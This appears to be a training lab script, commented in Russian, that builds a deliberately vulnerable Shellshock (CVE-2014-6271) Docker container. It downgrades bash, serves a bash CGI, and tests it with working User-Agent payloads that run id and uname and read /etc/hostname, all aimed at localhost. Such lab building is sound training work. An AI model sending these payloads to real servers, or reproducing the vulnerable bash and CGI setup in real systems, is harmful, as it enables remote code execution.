#!/bin/bash
# shellshock_docker_lab.sh
# Лаборатория Shellshock (CVE-2014-6271) на ubuntu:14.04.

# Запуск: sudo ./shellshock_docker_lab.sh [PORT]

set -u

IMAGE_NAME="shellshock-lab"
CONTAINER_NAME="shellshock-lab"
HOST_PORT="${1:-8080}"

PAYLOAD='() { :;}; echo&&echo&&echo 64654646464564654654-_VULNERABLE!>&1'
MARKER='64654646464564654654-_VULNERABLE!'

export no_proxy="127.0.0.1,localhost"
export NO_PROXY="127.0.0.1,localhost"
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY 2>/dev/null || true

LAB_DIR="$(cd "$(dirname "$0")" && pwd)/shellshock_lab"
mkdir -p "$LAB_DIR"
cd "$LAB_DIR"

port_in_use() {
    ss -ltn "( sport = :$1 )" 2>/dev/null | grep -q ":$1"
}

port_busy_explanation() {
    local port="$1"
    echo "[-] Порт $port уже занят."
    echo
    echo "    Кто слушает порт:"
    if command -v ss >/dev/null 2>&1; then
        ss -ltnp "( sport = :$port )" 2>/dev/null | sed 's/^/      /'
    fi
    echo
    echo "    Контейнеры, публикующие порт $port (если есть):"
    local found
    found=$(docker ps -a --format '{{.ID}} {{.Names}} {{.Ports}}' 2>/dev/null \
        | grep -E "[:.]$port->|:$port/tcp" || true)
    if [[ -n "$found" ]]; then
        echo "$found" | sed 's/^/      /'
    else
        echo "      нет"
    fi
    echo
}

# ---------- 0. Цикл выбора порта ----------
while port_in_use "$HOST_PORT"; do
    port_busy_explanation "$HOST_PORT"
    echo "    Скрипт НЕ удаляет чужие контейнеры и не трогает процессы хоста."
    echo "    Введи другой свободный порт (или 'q' для выхода)."
    while true; do
        read -r -p "    Новый порт: " NEW_PORT
        if [[ "$NEW_PORT" == "q" || "$NEW_PORT" == "Q" ]]; then
            echo "Завершение."
            exit 0
        fi
        if ! [[ "$NEW_PORT" =~ ^[0-9]+$ ]]; then
            echo "    [!] Порт должен быть числом. Попробуй ещё раз."
            continue
        fi
        if (( NEW_PORT < 1 || NEW_PORT > 65535 )); then
            echo "    [!] Порт должен быть в диапазоне 1..65535."
            continue
        fi
        if port_in_use "$NEW_PORT"; then
            echo "    [!] Порт $NEW_PORT тоже занят. Попробуй другой."
            continue
        fi
        HOST_PORT="$NEW_PORT"
        echo "    [+] Порт $HOST_PORT свободен, продолжаю."
        break
    done
done

echo "=================================================="
echo "[*] Порт:    $HOST_PORT"
echo "[*] Каталог: $LAB_DIR"
echo "[*] Образ:   $IMAGE_NAME"
echo "=================================================="

# ---------- 1. Уборка предыдущего запуска лаборатории ----------
if docker ps -a --format '{{.Names}}' | grep -qx "$CONTAINER_NAME"; then
    echo "[*] Найден старый контейнер '$CONTAINER_NAME' — удаляю..."
    docker rm -f "$CONTAINER_NAME" >/dev/null 2>&1 || true
    echo "[+] Старый контейнер удалён."
fi
echo "[+] Порт $HOST_PORT свободен."
echo

# ---------- 2. Dockerfile ----------
echo "[*] Пишу Dockerfile..."
cat > Dockerfile <<'DOCKERFILE'
FROM ubuntu:14.04

ENV PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ENV DEBIAN_FRONTEND=noninteractive

# --- 1. Нормализация зеркал ---
RUN sed -i -E 's|https?://[a-z]{2}\.archive\.ubuntu\.com|http://archive.ubuntu.com|g; \
               s|https?://[a-z]{2}\.security\.ubuntu\.com|http://security.ubuntu.com|g' \
        /etc/apt/sources.list

# --- 2. Откат bash к release-версии trusty (апрель 2014, до CVE-2014-6271) ---
RUN apt-get update && \
    BASH_VULN=$(apt-cache madison bash | awk '{print $3}' | sort -V | head -1) && \
    echo "### Откатываю bash к версии: ${BASH_VULN}" && \
    apt-get install -y --force-yes --no-install-recommends "bash=${BASH_VULN}" && \
    rm -rf /var/lib/apt/lists/*

# --- 3. Жёсткая проверка уязвимости прямо в сборке ---
RUN set -e; \
    OUT=$(env x='() { :;}; echo VULN_ON_BUILD' bash -c 'true'); \
    if ! echo "$OUT" | grep -q VULN_ON_BUILD; then \
        echo "FATAL: bash внутри образа НЕ уязвим"; \
        bash --version; exit 1; \
    fi; \
    echo "### Проверка пройдена: bash уязвим (CVE-2014-6271)"

# --- 4. Apache + CGI + утилиты для RCE ---
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        apache2 coreutils procps net-tools && \
    a2enmod cgi && \
    rm -rf /var/lib/apt/lists/*

# --- 4b. PATH для CGI-потомков Apache ---
RUN printf 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n' \
        >> /etc/apache2/envvars

# --- 5. Свой vhost: любой URL -> /var/www/cgi-bin/index.cgi ---
RUN printf '%s\n' \
        'ServerName shellshock-lab' \
        '' \
        '<VirtualHost *:80>' \
        '    ServerName shellshock-lab' \
        '    DocumentRoot /var/www/cgi-bin' \
        '    ScriptAlias / /var/www/cgi-bin/' \
        '    <Directory /var/www/cgi-bin>' \
        '        Options +ExecCGI +Indexes +FollowSymLinks' \
        '        AllowOverride None' \
        '        Require all granted' \
        '        DirectoryIndex index.cgi' \
        '        SetEnv PATH "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"' \
        '    </Directory>' \
        '    ErrorLog /var/log/apache2/error.log' \
        '    CustomLog /var/log/apache2/access.log combined' \
        '</VirtualHost>' \
        > /etc/apache2/sites-available/000-default.conf

# --- 6. Уязвимый CGI на bash, обслуживает "/" ---
RUN mkdir -p /var/www/cgi-bin && \
    printf '%s\n' \
        '#!/bin/bash' \
        'echo "Content-Type: text/html"' \
        'echo' \
        'echo "<html><body><h1>CGI OK</h1>"' \
        'echo "<p>UA: ${HTTP_USER_AGENT}</p>"' \
        'echo "</body></html>"' \
        > /var/www/cgi-bin/index.cgi && \
    chmod 755 /var/www/cgi-bin/index.cgi

EXPOSE 80
CMD ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
DOCKERFILE

# ---------- 3. Сборка ----------
echo "[*] Собираю образ (--no-cache, полный лог)..."
if ! docker build --no-cache -t "$IMAGE_NAME" .; then
    echo "[-] Сборка провалилась."
    exit 1
fi
echo "[+] Образ собран."
echo

# ---------- 4. Запуск ----------
echo "[*] Запускаю контейнер $CONTAINER_NAME на $HOST_PORT -> 80..."
docker run -d --name "$CONTAINER_NAME" -p "${HOST_PORT}:80" "$IMAGE_NAME" >/dev/null \
    || { echo "[-] docker run провалился"; exit 1; }

sleep 2
if ! docker ps --filter "name=$CONTAINER_NAME" --filter "status=running" -q | grep -q .; then
    echo "[-] Контейнер упал. Логи:"
    docker logs "$CONTAINER_NAME" 2>&1 | tail -40 | sed 's/^/    /'
    exit 1
fi
echo "[+] Контейнер запущен."

# ---------- 5. Ожидание Apache ----------
echo "[*] Жду Apache..."
READY=0
for i in {1..30}; do
    CODE=$(curl -s --noproxy '*' -o /dev/null -w '%{http_code}' --max-time 2 \
        "http://127.0.0.1:${HOST_PORT}/" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
        echo "[+] Apache ответил 200 (${i}s)"
        READY=1
        break
    fi
    sleep 1
done
if [[ $READY -ne 1 ]]; then
    echo "[-] Apache не ответил 200 за 30с (код: $CODE). Логи:"
    docker logs "$CONTAINER_NAME" 2>&1 | tail -40 | sed 's/^/    /'
    exit 1
fi

# ---------- 6. Проверка bash внутри ----------
echo "[*] Проверяю bash в контейнере..."
BASH_TEST=$(docker exec "$CONTAINER_NAME" bash -c "env x='() { :;}; echo INNER_OK' bash -c 'true'" 2>/dev/null || true)
if echo "$BASH_TEST" | grep -q INNER_OK; then
    echo "[+] bash уязвим (подтверждено изнутри)"
else
    echo "[-] bash внутри НЕ уязвим:"
    docker exec "$CONTAINER_NAME" bash --version | head -1 | sed 's/^/    /'
    exit 1
fi
echo

# ---------- 7. Само-проверка ----------
echo "=================================================="
echo "[*] Отправляю пейлоад:"
echo "    User-Agent: $PAYLOAD"
echo
echo "--- ответ сервера ---"
HTTP_CODE=$(curl -s --noproxy '*' -o /tmp/.ss_lab -w '%{http_code}' --max-time 5 \
    -A "$PAYLOAD" "http://127.0.0.1:${HOST_PORT}/" || echo "000")
RESP=$(cat /tmp/.ss_lab 2>/dev/null || true); rm -f /tmp/.ss_lab
echo "HTTP $HTTP_CODE"
echo "$RESP"
echo "---------------------"
echo

SCANNER_OK=0
echo "$RESP" | grep -q "$MARKER" && SCANNER_OK=1

echo "[*] Проверяю RCE (PATH + id + uname + hostname)..."
RCE_PAYLOAD='() { :;}; echo "Content-Type: text/plain"; echo; echo __B__; echo "PATH=$PATH"; id; uname -a; cat /etc/hostname; echo __E__'
RCE=$(curl -s --noproxy '*' --max-time 5 -A "$RCE_PAYLOAD" \
    "http://127.0.0.1:${HOST_PORT}/" || true)
echo "--- вывод RCE-запроса ---"
echo "$RCE"
echo "-------------------------"
echo

RCE_OK=0
echo "$RCE" | grep -q "uid=" && RCE_OK=1

echo "=================================================="
if [[ $SCANNER_OK -eq 1 && $RCE_OK -eq 1 ]]; then
    echo "[+] SUCCESS: лаборатория уязвима, RCE работает."
    echo
    echo "[i] Запускайте сканер:"
    echo "        python3 shellshock_scanner.py 127.0.0.1 $HOST_PORT"
    echo "    Ожидаемо в выводе:"
    echo "        VULNERABILITY found on http://127.0.0.1:${HOST_PORT}[VULNERABLE]"
    echo "    Затем запускайте эксплойт с целью 127.0.0.1:${HOST_PORT}."
elif [[ $SCANNER_OK -eq 1 && $RCE_OK -eq 0 ]]; then
    echo "[!] ЧАСТИЧНО: сканер лабораторию увидит, но RCE не работает."
    echo "    Смотрите строку PATH= в выводе выше."
    echo "    Если PATH пуст или без /usr/bin — SetEnv PATH не применился, проверьте:"
    echo "        docker exec $CONTAINER_NAME cat /etc/apache2/sites-enabled/000-default.conf"
    echo "        docker exec $CONTAINER_NAME cat /etc/apache2/envvars"
else
    echo "[-] FAIL: маркер '$MARKER' не найден в ответе сканеру."
    echo "    Логи Apache (stderr):"
    docker logs "$CONTAINER_NAME" 2>&1 | tail -30 | sed 's/^/    /'
    echo "    error.log изнутри контейнера:"
    docker exec "$CONTAINER_NAME" bash -c 'tail -30 /var/log/apache2/error.log' 2>&1 | sed 's/^/    /' || true
fi
echo "=================================================="
echo
echo "[i] Остановить: docker rm -f $CONTAINER_NAME"
